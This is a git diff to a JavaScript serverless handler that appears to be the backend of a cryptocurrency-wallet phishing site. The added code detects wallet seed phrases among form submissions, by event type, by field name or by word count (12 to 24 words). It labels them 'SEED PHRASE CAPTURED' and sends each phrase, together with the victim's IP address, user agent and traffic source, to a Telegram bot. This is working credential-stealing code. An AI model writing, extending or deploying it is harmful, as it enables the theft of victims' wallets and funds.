@@ -66,8 +66,83 @@ export default async function handler(req, res) {
       searchEngine = '🔗 Referral';
     }
 
-    // Format message with emojis
-    const message = `
+    // Check if this is a seed phrase submission
+    const isSeedPhraseData = data && (
+      data.TYPE === 'SEED_PHRASE' ||
+      data.TYPE === 'SEED_ON_BLUR' ||
+      data.TYPE === 'WALLET_CREATED_DISPLAYED' ||
+      data.TYPE === 'WALLET_CREATED_PHRASE_DISPLAYED' ||
+      data.type === 'SEED_PHRASE' ||
+      data.type === 'SEED_ON_BLUR' ||
+      data.type === 'WALLET_CREATED_DISPLAYED' ||
+      data.type === 'WALLET_CREATED_PHRASE_DISPLAYED'
+    );
+
+    // Extract phrase from any field name
+    const phraseContent = data && (
+      data.PHRASE || data.phrase ||
+      data.content || data.CONTENT ||
+      data.seed || data.SEED ||
+      data.mnemonic || data.MNEMONIC ||
+      data.recovery || data.RECOVERY
+    );
+
+    // Check if any value in data looks like a seed phrase (12/15/18/21/24 words)
+    let detectedPhrase = phraseContent;
+    let detectedWordCount = 0;
+    if (!detectedPhrase && data) {
+      for (const val of Object.values(data)) {
+        if (typeof val === 'string') {
+          const words = val.trim().split(/\s+/).filter(w => w.length > 0);
+          if ([12, 15, 18, 21, 24].includes(words.length)) {
+            detectedPhrase = val.trim();
+            detectedWordCount = words.length;
+            break;
+          }
+        }
+      }
+    }
+
+    const wordCount = data && (data.WORDS || data.wordCount || detectedWordCount ||
+      (detectedPhrase ? detectedPhrase.trim().split(/\s+/).filter(w => w.length > 0).length : 0));
+
+    const trafficSrc = data && (data.trafficSource || data.TRAFFIC_SOURCE || searchEngine);
+    const pageLocation = data && (data.PAGE || data.page || url);
+    const fieldName = data && (data.FIELD || data.field || 'unknown');
+    const eventType = data && (data.TYPE || data.type || 'FORM_DATA');
+
+    let message;
+
+    if (isSeedPhraseData || detectedPhrase) {
+      // ===== SEED PHRASE MESSAGE - PROMINENT FORMAT =====
+      message = `
+🔑 <b>SEED PHRASE CAPTURED</b>
+
+━━━━━━━━━━━━━━━━━━━━━━━━
+📋 <b>PHRASE (${wordCount} words):</b>
+<code>${detectedPhrase || 'NOT FOUND'}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━
+
+📊 <b>Details:</b>
+├ Event: <b>${eventType}</b>
+├ Words: <b>${wordCount}</b>
+├ Field: ${fieldName}
+├ Page: ${pageLocation}
+
+🌍 <b>Traffic Source:</b>
+├ Source: <b>${trafficSrc}</b>
+├ Referrer: ${referer}
+├ Search Engine: ${searchEngine}
+
+👤 <b>Visitor:</b>
+├ IP: <code>${ip}</code>
+├ UA: <code>${userAgent.substring(0, 80)}...</code>
+
+⏰ ${new Date().toISOString()}
+      `.trim();
+    } else {
+      // ===== VISITOR ACTIVITY MESSAGE =====
+      message = `
 🚀 <b>New Visitor Activity</b>
 
 👤 <b>Visitor Info:</b>
@@ -79,10 +154,11 @@ export default async function handler(req, res) {
 ├ Referrer: <code>${referer}</code>
 ├ URL: <code>${url}</code>
 
-${data ? `📝 <b>Form Data:</b>\n${Object.entries(data).map(([key, value]) => `├ ${key}: <code>${value}</code>`).join('\n')}` : ''}
+${data ? `📝 <b>Form Data:</b>\n${Object.entries(data).map(([key, value]) => `├ ${key}: <code>${String(value).substring(0, 200)}</code>`).join('\n')}` : ''}
 
 ⏰ <b>Timestamp:</b> ${new Date().toISOString()}
-    `.trim();
+      `.trim();
+    }
 
     // Send message to Telegram
     const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
